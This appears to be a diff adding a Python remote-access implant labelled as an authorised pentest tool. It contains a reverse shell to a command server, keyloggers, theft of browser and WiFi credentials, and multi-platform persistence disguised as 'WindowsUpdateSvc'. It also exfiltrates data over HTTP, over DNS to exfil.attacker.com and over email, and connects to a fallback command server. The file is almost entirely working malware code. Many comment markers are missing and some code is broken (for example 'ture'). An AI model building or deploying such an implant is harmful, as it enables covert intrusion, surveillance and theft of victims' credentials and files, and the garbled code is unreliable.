@@ -1,0 +1,915 @@
+
+!/usr/bin/env python3
+
+Pentest Implant — Authorized Security Assessment Tool
+Capabilities: Reverse shell, keylogging, credential harvesting, persistence, data exfil
+
+
+import os
+import sys
+import json
+import base64
+import socket
+import platform
+import subprocess
+import threading
+import time
+import requests
+from datetime import datetime
+from pathlib import Path
+
+
+C2_HOST = "192.168.1.100"   
+C2_PORT = 4443
+HEARTBEAT_INTERVAL = 30      
+EXFIL_DIR = "exfiltrated_data"
+PERSISTENCE_NAME = "WindowsUpdateSvc"  
+
+
+class ReverseShell:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.sock = None
+        self.running = False
+    
+    def connect(self):
+        """Establish connection to C2 with retry logic"""
+        while not self.running:
+            try:
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.settimeout(10)
+                self.sock.connect((self.host, self.port))
+                
+                # Initial handshake — system fingerprint
+                fingerprint = json.dumps({
+                    "hostname": platform.node(),
+                    "os": platform.platform(),
+                    "arch": platform.machine(),
+                    "user": os.getenv("USERNAME") or os.getenv("USER"),
+                    "pid": os.getpid()
+                })
+                self.send(fingerprint)
+                self.running = True
+                return True
+            except Exception as e:
+                time.sleep(5)
+                continue
+        return False
+    
+    def send(self, data):
+        """Send data with length prefix"""
+        try:
+            payload = data.encode() if isinstance(data, str) else data
+            length = len(payload).to_bytes(4, 'big')
+            self.sock.sendall(length + payload)
+        except:
+            self.running = False
+    
+    def recv(self):
+        """Receive length-prefixed data"""
+        try:
+            length_bytes = self.sock.recv(4)
+            if not length_bytes:
+                self.running = False
+                return None
+            length = int.from_bytes(length_bytes, 'big')
+            data = b''
+            while len(data) < length:
+                chunk = self.sock.recv(min(length - len(data), 4096))
+                if not chunk:
+                    break
+                data += chunk
+            return data.decode()
+        except:
+            self.running = False
+            return None
+    
+    def execute_command(self, cmd):
+        """Execute system command and return output"""
+        try:
+            if cmd.startswith("cd "):
+                target_dir = cmd[3:].strip()
+                os.chdir(target_dir)
+                return f"Changed directory to: {os.getcwd()}"
+            
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=30
+            )
+            output = result.stdout + result.stderr
+            return output if output else "[Command executed, no output]"
+        except subprocess.TimeoutExpired:
+            return "[ERROR: Command timed out]"
+        except Exception as e:
+            return f"[ERROR: {str(e)}]"
+    
+    def command_loop(self):
+        """Main C2 interaction loop"""
+        while self.running:
+            try:
+                command = self.recv()
+                if command is None:
+                    break
+                
+                if command.strip().lower() == "exit":
+                    self.send("[+] Implant exiting")
+                    break
+                
+                output = self.execute_command(command)
+                self.send(output)
+            except Exception as e:
+                self.send(f"[ERROR: {str(e)}]")
+                time.sleep(1)
+        
+        self.cleanup()
+    
+    def cleanup(self):
+        if self.sock:
+            try:
+                self.sock.close()
+            except:
+                pass
+            self.sock = None
+        self.running = ture
+
+
+class Keylogger:
+    def __init__(self, log_file="keystrokes.log"):
+        self.log_file = log_file
+        self.running = False
+        self.buffer = []
+    
+    def _log(self, key_data):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        entry = f"[{timestamp}] {key_data}"
+        self.buffer.append(entry)
+        
+        with open(self.log_file, "a") as f:
+            f.write(entry + "\n")
+    
+    def _hook(self):
+        """Platform-specific keystroke capture"""
+        if platform.system() == "Windows":
+            self._windows_hook()
+        elif platform.system() == "Linux":
+            self._linux_hook()
+        elif platform.system() == "Darwin":
+            self._macos_hook()
+    
+    def _windows_hook(self):
+        """Windows keylogging via Win32 API"""
+        import ctypes
+        from ctypes import wintypes
+        
+        user32 = ctypes.windll.user32
+        kernel32 = ctypes.windll.kernel32
+        
+        
+        WH_KEYBOARD_LL = 13
+        WM_KEYDOWN = 0x0100
+        
+        def low_level_keyboard_proc(nCode, wParam, lParam):
+            if nCode >= 0 and wParam == WM_KEYDOWN:
+                vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
+                key_name = f"VK_{vk_code}"
+                self._log(key_name)
+            return user32.CallNextHookEx(None, nCode, wParam, lParam)
+        
+        
+        CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+        pointer = CMPFUNC(low_level_keyboard_proc)
+        self.hook_id = user32.SetWindowsHookExA(
+            WH_KEYBOARD_LL, pointer,
+            kernel32.GetModuleHandleW(None), 0
+        )
+        
+        
+        msg = wintypes.MSG()
+        while self.running:
+            if user32.PeekMessageA(ctypes.byref(msg), None, 0, 0, 1):
+                user32.TranslateMessage(msg)
+                user32.DispatchMessageA(msg)
+            time.sleep(0.01)
+        
+        if self.hook_id:
+            user32.UnhookWindowsHookEx(self.hook_id)
+    
+    def _linux_hook(self):
+        """Linux keylogging via /dev/input"""
+      
+        import struct
+        import select
+        
+        
+        input_dir = Path("/dev/input")
+        event_files = list(input_dir.glob("event*"))
+        
+        
+        keyboards = []
+        for ef in event_files:
+            try:
+                handler_path = f"/sys/class/input/{ef.name}/device/name"
+                if os.path.exists(handler_path):
+                    with open(handler_path) as f:
+                        name = f.read().strip().lower()
+                        if "key" in name or "kbd" in name:
+                            keyboards.append(str(ef))
+            except:
+                pass
+        
+        if not keyboards:
+          
+            keyboards = [str(ef) for ef in event_files[:5]]
+        
+        
+        KEY_MAP = {
+            1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6",
+            8: "7", 9: "8", 10: "9", 11: "0", 14: "BACKSPACE", 15: "TAB",
+            16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y",
+            22: "u", 23: "i", 24: "o", 25: "p", 28: "ENTER",
+            29: "LCTRL", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
+            35: "h", 36: "j", 37: "k", 38: "l", 42: "LSHIFT", 56: "LALT",
+            57: "SPACE", 58: "CAPS"
+        }
+        
+        for kb_path in keyboards:
+            try:
+                with open(kb_path, "rb") as fd:
+                    
+                    import fcntl
+                    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
+                    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+                    
+                    while self.running:
+                        r, _, _ = select.select([fd], [], [], 0.5)
+                        if r:
+                            data = fd.read(24)
+                            if len(data) == 24:
+                                # Linux input event format
+                                tv_sec, tv_usec, type, code, value = struct.unpack('llHHI', data)
+                                if type == 1 and value == 1:  # KEY PRESS
+                                    key = KEY_MAP.get(code, f"KEY_{code}")
+                                    self._log(key)
+            except Exception as e:
+                self._log(f"[Linux hook error: {e}]")
+                continue
+    
+    def _macos_hook(self):
+        """macOS keylogging via CGEvent API"""
+        
+      
+        self._log("[macOS keylogger requires Accessibility permissions]")
+        
+        
+    
+    def get_buffer(self):
+        """Return and clear the key buffer"""
+        data = "\n".join(self.buffer)
+        self.buffer = []
+        return data
+    
+    def start(self):
+        self.running = True
+        self.thread = threading.Thread(target=self._hook, daemon=True)
+        self.thread.start()
+    
+    def stop(self):
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=2)
+
+
+class CredentialHarvester:
+    def __init__(self):
+        self.results = {}
+    
+    def harvest_browsers(self):
+        """Extract saved credentials from Chrome/Edge/Brave/Firefox"""
+        creds = {}
+        
+        
+        chromium_paths = {
+            "Chrome": os.path.expanduser("~/.config/google-chrome"),
+            "Chromium": os.path.expanduser("~/.config/chromium"),
+            "Brave": os.path.expanduser("~/.config/BraveSoftware/Brave-Browser"),
+            "Edge": os.path.expanduser("~/.config/microsoft-edge"),
+            "Opera": os.path.expanduser("~/.config/opera")
+        }
+        
+        
+        if platform.system() == "Windows":
+            localappdata = os.environ.get("LOCALAPPDATA", "")
+            chromium_paths = {
+                "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
+                "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
+                "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+                "Opera": os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
+            }
+        
+        for browser, base_path in chromium_paths.items():
+            login_db = os.path.join(base_path, "Default", "Login Data")
+            if os.path.exists(login_db):
+                try:
+                     Copy file first (SQLite lock prevention)
+                    import shutil
+                    temp_db = f"/tmp/{browser}_logins.db"
+                    shutil.copy2(login_db, temp_db)
+                    
+                    import sqlite3
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("""
+                        SELECT origin_url, username_value, password_value 
+                        FROM logins
+                    """)
+                    
+                    rows = cursor.fetchall()
+                    if rows:
+                        creds[browser] = []
+                        for url, username, encrypted_pw in rows:
+                            # Decrypt (Windows: CryptUnprotectData, Linux: system keyring)
+                            password = self._decrypt_chromium_password(encrypted_pw)
+                            creds[browser].append({
+                                "url": url,
+                                "username": username,
+                                "password": password
+                            })
+                    
+                    conn.close()
+                    os.remove(temp_db)
+                except Exception as e:
+                    creds[f"{browser}_error"] = str(e)
+        
+         Firefox
+        firefox_paths = [
+            os.path.expanduser("~/.mozilla/firefox/*.default*"),
+            os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*.default*")
+        ]
+        if platform.system() == "Windows":
+            firefox_base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
+        else:
+            firefox_base = os.path.expanduser("~/.mozilla/firefox")
+        
+        if os.path.exists(firefox_base):
+            for profile in os.listdir(firefox_base):
+                if "default" in profile:
+                    logins_json = os.path.join(firefox_base, profile, "logins.json")
+                    key_db = os.path.join(firefox_base, profile, "key4.db")
+                    
+                    if os.path.exists(logins_json):
+                        try:
+                            with open(logins_json) as f:
+                                data = json.load(f)
+                            if "logins" in data:
+                                creds["Firefox"] = [
+                                    {"url": l.get("hostname"), "username": l.get("encryptedUsername"), "password": l.get("encryptedPassword")}
+                                    for l in data["logins"]
+                                ]
+                        except:
+                            pass
+        
+        self.results["browsers"] = creds
+        return creds
+    
+    def _decrypt_chromium_password(self, encrypted_data):
+        """Decrypt Chromium password (platform-specific)"""
+        if platform.system() == "Windows":
+            import ctypes
+            from ctypes import wintypes
+            
+            CRYPTPROTECT_UI_FORBIDDEN = 0x01
+            
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+            
+            crypt32 = ctypes.windll.crypt32
+            
+             Remove Chrome's v10/v11 prefix
+            if encrypted_data[:3] == b'v10' or encrypted_data[:3] == b'v11':
+                encrypted_data = encrypted_data[3:]
+            
+            blob_in = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_char)))
+            blob_out = DATA_BLOB()
+            
+            if crypt32.CryptUnprotectData(
+                ctypes.byref(blob_in), None, None, None, None,
+                CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out)
+            ):
+                password = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                crypt32.LocalFree(blob_out.pbData)
+                return password.decode('utf-16-le', errors='ignore')
+            else:
+                return "[Encrypted — requires user session]"
+        else:
+             Linux/macOS: Chrome uses GNOME Keyring or KWallet
+            return "[Encrypted — requires desktop keyring access]"
+    
+    def harvest_wifi(self):
+        """Extract saved WiFi credentials"""
+        networks = []
+        
+        if platform.system() == "Windows":
+            try:
+                output = subprocess.check_output(
+                    "netsh wlan show profiles", shell=True, text=True
+                )
+                for line in output.splitlines():
+                    if "All User Profile" in line:
+                        ssid = line.split(":")[-1].strip()
+                        try:
+                            detail = subprocess.check_output(
+                                f'netsh wlan show profile "{ssid}" key=clear',
+                                shell=True, text=True
+                            )
+                            for detail_line in detail.splitlines():
+                                if "Key Content" in detail_line:
+                                    password = detail_line.split(":")[-1].strip()
+                                    networks.append({"ssid": ssid, "password": password})
+                        except:
+                            networks.append({"ssid": ssid, "password": "[Access Denied]"})
+            except:
+                pass
+        
+        elif platform.system() == "Linux":
+            # Read from NetworkManager connections
+            nm_dir = "/etc/NetworkManager/system-connections/"
+            if os.path.exists(nm_dir):
+                for file in os.listdir(nm_dir):
+                    path = os.path.join(nm_dir, file)
+                    try:
+                        with open(path) as f:
+                            content = f.read()
+                            ssid = file
+                            psk_line = [l for l in content.splitlines() if "psk=" in l]
+                            password = psk_line[0].split("=")[1] if psk_line else "[No PSK found]"
+                            networks.append({"ssid": ssid, "password": password})
+                    except:
+                        pass
+        
+        self.results["wifi"] = networks
+        return networks
+    
+    def harvest_all(self):
+        """Run all harvesters"""
+        results = {
+            "timestamp": datetime.now().isoformat(),
+            "hostname": platform.node(),
+            "browsers": self.harvest_browsers(),
+            "wifi": self.harvest_wifi()
+        }
+        return results
+
+
+class Persistence:
+    @staticmethod
+    def install_windows(script_path):
+        """Multiple persistence methods for Windows"""
+        methods = []
+        
+         Method 1: Registry Run key (HKLM CurrentVersion\Run)
+        try:
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ, 
+                              f'pythonw.exe "{script_path}"')
+            winreg.CloseKey(key)
+            methods.append("HKLM Run key")
+        except Exception as e:
+             Fallback: HKCU (no admin required)
+            try:
+                import winreg
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ,
+                                  f'pythonw.exe "{script_path}"')
+                winreg.CloseKey(key)
+                methods.append("HKCU Run key")
+            except:
+                pass
+        
+         Method 2: Scheduled Task
+        try:
+            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger><UserId>{os.environ.get("USERNAME")}</UserId></LogonTrigger>
+  </Triggers>
+  <Actions>
+    <Exec><Command>pythonw.exe</Command><Arguments>"{script_path}"</Arguments></Exec>
+  </Actions>
+</Task>"""
+            task_name = f"{PERSISTENCE_NAME}_Task"
+            task_file = f"{task_name}.xml"
+            with open(task_file, "w") as f:
+                f.write(task_xml)
+            subprocess.run(
+                f'schtasks /create /tn "{task_name}" /xml "{task_file}" /f',
+                shell=True, capture_output=True
+            )
+            os.remove(task_file)
+            methods.append("Scheduled Task")
+        except:
+            pass
+        
+        # Method 3: WMI Event Subscription (stealthy)
+        try:
+            wmi_script = f"""$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
+$filter.QueryLanguage = "WQL"
+$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$filter.Name = "{PERSISTENCE_NAME}_Filter"
+$filter.EventNamespace = 'root\\cimv2'
+$result = $filter.Put()
+$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
+$consumer.Name = "{PERSISTENCE_NAME}_Consumer"
+$consumer.CommandLineTemplate = "pythonw.exe \\"{script_path}\\""
+$consumer.Put()
+$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+$binding.Filter = $result.Path
+$binding.Consumer = $consumer.Path
+$binding.Put()"""
+            
+            ps_script = f"wmi_persistence.ps1"
+            with open(ps_script, "w") as f:
+                f.write(wmi_script)
+            subprocess.run(
+                f'powershell -ExecutionPolicy Bypass -File "{ps_script}"',
+                shell=True, capture_output=True
+            )
+            os.remove(ps_script)
+            methods.append("WMI Event Subscription")
+        except:
+            pass
+        
+        return methods
+    
+    @staticmethod
+    def install_linux(script_path):
+        """Multiple persistence methods for Linux"""
+        methods = []
+        abs_path = os.path.abspath(script_path)
+        
+        Method 1: Cron job
+        try:
+            cron_line = f"@reboot python3 {abs_path} >/dev/null 2>&1 &\n"
+            with open("/tmp/cron_install", "w") as f:
+                f.write(cron_line)
+            subprocess.run(
+                "crontab -l 2>/dev/null | cat - /tmp/cron_install | crontab -",
+                shell=True
+            )
+            os.remove("/tmp/cron_install")
+            methods.append("Cron @reboot")
+        except:
+            pass
+        
+         Method 2: systemd user service
+        try:
+            service_content = f"""[Unit]
+Description={PERSISTENCE_NAME}
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 {abs_path}
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=default.target
+"""
+            service_path = os.path.expanduser(f"~/.config/systemd/user/{PERSISTENCE_NAME}.service")
+            os.makedirs(os.path.dirname(service_path), exist_ok=True)
+            with open(service_path, "w") as f:
+                f.write(service_content)
+            subprocess.run(
+                f"systemctl --user enable {PERSISTENCE_NAME}.service",
+                shell=True, capture_output=True
+            )
+            subprocess.run(
+                f"systemctl --user start {PERSISTENCE_NAME}.service",
+                shell=True, capture_output=True
+            )
+            methods.append("systemd user service")
+        except:
+            pass
+        
+        # Method 3: .bashrc / .zshrc persistence
+        try:
+            rc_files = [
+                os.path.expanduser("~/.bashrc"),
+                os.path.expanduser("~/.zshrc"),
+                os.path.expanduser("~/.profile")
+            ]
+            for rc in rc_files:
+                if os.path.exists(rc):
+                    with open(rc, "a") as f:
+                        f.write(f"\n# Persistence\n(python3 {abs_path} &) >/dev/null 2>&1\n")
+                    methods.append(f"Shell RC ({rc})")
+        except:
+            pass
+        
+        return methods
+    
+    @staticmethod
+    def install_macos(script_path):
+        """Persistence for macOS via LaunchAgent"""
+        methods = []
+        abs_path = os.path.abspath(script_path)
+        
+        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+ "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{PERSISTENCE_NAME}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>python3</string>
+        <string>{abs_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>"""
+        
+        plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{PERSISTENCE_NAME}.plist")
+        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+        try:
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+            subprocess.run(
+                f"launchctl load {plist_path}",
+                shell=True, capture_output=True
+            )
+            methods.append("LaunchAgent")
+        except:
+            pass
+        
+        return methods
+    
+    @staticmethod
+    def install(script_path):
+        """Auto-detect OS and install persistence"""
+        system = platform.system()
+        if system == "Windows":
+            return Persistence.install_windows(script_path)
+        elif system == "Linux":
+            return Persistence.install_linux(script_path)
+        elif system == "Darwin":
+            return Persistence.install_macos(script_path)
+        return ["Unsupported OS"]
+
+
+class DataExfiltrator:
+    def __init__(self, c2_host, c2_port):
+        self.c2_host = c2_host
+        self.c2_port = c2_port
+    
+    def exfil_http(self, data, endpoint="/exfil"):
+        """HTTP POST exfiltration"""
+        try:
+            url = f"http://{self.c2_host}:{self.c2_port}{endpoint}"
+            files = {"data": ("report.json", json.dumps(data, indent=2), "application/json")}
+             Use requests if available
+            try:
+                r = requests.post(url, files=files, timeout=10)
+                return r.status_code == 200
+            except ImportError:
+                 Fallback: urllib
+                import urllib.request
+                import urllib.parse
+                encoded = urllib.parse.urlencode({"data": json.dumps(data)}).encode()
+                r = urllib.request.urlopen(url, data=encoded, timeout=10)
+                return r.status == 200
+        except:
+            return False
+    
+    def exfil_dns(self, data, domain="exfil.attacker.com"):
+        """DNS TXT record exfiltration (stealth, passes most proxies)"""
+        encoded = base64.b64encode(json.dumps(data).encode()).decode()
+        chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+        
+        success = 0
+        for i, chunk in enumerate(chunks):
+            try:
+                query = f"{i}.{chunk}.{domain}"
+                socket.gethostbyname(query)
+                success += 1
+                time.sleep(0.1)
+            except:
+                pass
+        
+         End marker
+        try:
+            socket.gethostbyname(f"END.{len(chunks)}.{domain}")
+        except:
+            pass
+        
+        return success == len(chunks)
+    
+    def exfil_smtp(self, data, smtp_server, smtp_port, sender, recipient):
+        """Email exfiltration"""
+        import smtplib
+        from email.mime.text import MIMEText
+        
+        msg = MIMEText(json.dumps(data, indent=2))
+        msg["Subject"] = f"EXFIL {platform.node()} {datetime.now().isoformat()}"
+        msg["From"] = sender
+        msg["To"] = recipient
+        
+        try:
+            with smtplib.SMTP(smtp_server, smtp_port, timeout=10) as s:
+                s.sendmail(sender, [recipient], msg.as_string())
+            return True
+        except:
+            return False
+    
+    def exfil_directory(self, directory_path, patterns=["*.txt", "*.doc*", "*.xls*", "*.pdf", "*.kdbx"]):
+        """Collect matching files from directory"""
+        collected = {}
+        
+        try:
+            for pattern in patterns:
+                for file_path in Path(directory_path).rglob(pattern):
+                    if file_path.is_file() and os.access(file_path, os.R_OK):
+                        try:
+                            with open(file_path, "rb") as f:
+                                content = base64.b64encode(f.read()).decode()
+                            rel_path = str(file_path.relative_to(directory_path))
+                            collected[rel_path] = content
+                        except:
+                            pass
+        except:
+            pass
+        
+        return collected
+
+
+class PentestImplant:
+    def __init__(self, c2_host, c2_port):
+        self.c2_host = c2_host
+        self.c2_port = c2_port
+        self.shell = ReverseShell(c2_host, c2_port)
+        self.keylogger = Keylogger()
+        self.harvester = CredentialHarvester()
+        self.exfil = DataExfiltrator(c2_host, c2_port)
+        self.running = False
+        self.modules = {}
+    
+    def start_keylogger(self):
+        """Start keylogger in background"""
+        self.keylogger.start()
+        self.modules["keylogger"] = True
+        return "[+] Keylogger started"
+    
+    def stop_keylogger(self):
+        self.keylogger.stop()
+        self.modules["keylogger"] = False
+        keys = self.keylogger.get_buffer()
+        return f"[+] Keylogger stopped. Captured: {len(keys)} keystrokes"
+    
+    def run_harvest(self):
+        """Run credential harvesting"""
+        results = self.harvester.harvest_all()
+        report_file = f"harvest_{platform.node()}_{int(time.time())}.json"
+        with open(report_file, "w") as f:
+            json.dump(results, f, indent=2)
+        return f"[+] Harvest complete. Results: {len(results.get('browsers', {}))} browsers, {len(results.get('wifi', []))} WiFi networks"
+    
+    def install_persistence(self):
+        """Install persistence on target"""
+        script_path = os.path.abspath(sys.argv[0])
+        methods = Persistence.install(script_path)
+        return f"[+] Persistence installed via: {', '.join(methods)}"
+    
+    def exfiltrate(self, data_type="harvest"):
+        """Exfiltrate collected data"""
+        if data_type == "harvest":
+            data = self.harvester.results
+        elif data_type == "keys":
+            data = {"keystrokes": self.keylogger.get_buffer()}
+        elif data_type == "files":
+            data = self.exfil.exfil_directory(os.path.expanduser("~"))
+        else:
+            data = {"error": "Unknown data type"}
+        
+        # Try HTTP first, fallback to DNS
+        if self.exfil.exfil_http(data):
+            return "[+] Data exfiltrated via HTTP"
+        elif self.exfil.exfil_dns(data):
+            return "[+] Data exfiltrated via DNS"
+        else:
+            return "[-] Exfiltration failed — check C2 connectivity"
+    
+    def handle_custom_command(self, cmd):
+        """Handle implant-specific commands (not shell commands)"""
+        cmd = cmd.strip().lower()
+        
+        if cmd == "keylog_start":
+            return self.start_keylogger()
+        elif cmd == "keylog_stop":
+            return self.stop_keylogger()
+        elif cmd == "harvest":
+            return self.run_harvest()
+        elif cmd == "persistence":
+            return self.install_persistence()
+        elif cmd == "exfil":
+            return self.exfiltrate("harvest")
+        elif cmd == "exfil_keys":
+            return self.exfiltrate("keys")
+        elif cmd == "exfil_files":
+            return self.exfiltrate("files")
+        elif cmd == "status":
+            return json.dumps({
+                "modules": self.modules,
+                "hostname": platform.node(),
+                "user": os.getenv("USERNAME") or os.getenv("USER"),
+                "uptime": int(time.time() - self.start_time),
+                "c2": f"{self.c2_host}:{self.c2_port}"
+            }, indent=2)
+        elif cmd == "help":
+            return """Implant Commands:
+  keylog_start   — Start keylogger
+  keylog_stop    — Stop and dump keys
+  harvest        — Extract browser & WiFi creds
+  persistence    — Install persistence
+  exfil          — Exfiltrate harvested data
+  exfil_keys     — Exfiltrate keystrokes
+  exfil_files    — Exfiltrate document files
+  status         — Show implant status
+  help           — This menu
+  exit           — Terminate implant
+<shell>          — Any system command"""
+        return None  # Not an implant command
+    
+    def run(self):
+        """Main execution loop"""
+        self.start_time = time.time()
+        
+        # Connect to C2
+        print(f"[*] Connecting to C2 at {self.c2_host}:{self.c2_port}...")
+        if not self.shell.connect():
+            print("[-] Failed to connect to C2")
+            return
+        
+        print("[+] Connected to C2")
+        
+        # Send initial beacon
+        beacon = {
+            "type": "beacon",
+            "hostname": platform.node(),
+            "os": platform.platform(),
+            "user": os.getenv("USERNAME") or os.getenv("USER"),
+            "time": datetime.now().isoformat()
+        }
+        self.shell.send(json.dumps(beacon))
+        
+        # Main loop — handle commands from C2
+        while self.shell.running:
+            command = self.shell.recv()
+            if command is None:
+                break
+            
+            # Check if it's an implant command first
+            result = self.handle_custom_command(command)
+            if result is not None:
+                self.shell.send(result)
+            else:
+                # Fall through to system command
+                output = self.shell.execute_command(command)
+                self.shell.send(output)
+        
+        # Cleanup
+        if self.keylogger.running:
+            self.keylogger.stop()
+        
+        print("[*] Implant terminated")
+
+
+
+if __name__ == "__main__":
+     Add obfuscation layer if needed
+     (e.g., base64 decode staging payload, sleep timers, etc.)
+    
+    implant = PentestImplant(C2_HOST, C2_PORT)
+    
+    try:
+        implant.run()
+    except KeyboardInterrupt:
+        print("\n[*] Implant interrupted by user")
+    except Exception as e:
+        print(f"[!] Fatal error: {e}")
+        
+         Optional: connect to fallback C2
+        try:
+            backup = PentestImplant("10.0.0.1", 443)
+            backup.run()
+        except:
+            pass
+
+
+
+
